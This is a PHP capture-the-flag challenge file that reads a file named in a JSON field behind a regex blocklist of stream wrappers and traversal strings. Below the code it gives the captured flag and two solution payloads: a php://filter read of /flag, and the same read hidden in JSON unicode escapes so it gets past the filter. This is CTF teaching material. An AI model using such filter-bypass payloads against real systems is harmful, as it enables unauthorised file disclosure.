<?php
error_reporting(0);

// get传入一个参数source
if (isset($_GET['source'])) {
  // 语法高亮一个文件
  show_source(__FILE__);
  exit();
}

function is_valid($str) {

  // 禁止了路径、协议、flag关键字
  $banword = [
    // 没有路径遍历
    '\.\.',
    // 没有流包装器
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // 没有数据泄露
    'flag'
  ];

  $regexp = '/' . implode('|', $banword) . '/i';

  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');

//对 JSON 格式的字符串进行解码,true表示已数组的格式输出，为false表示以object输出
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);

flag{36547473-19b1-4aad-815a-50f3a67ee143}

{"page":"php://filter/convert.base64-encode/resource=/flag"}
{"page":"\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}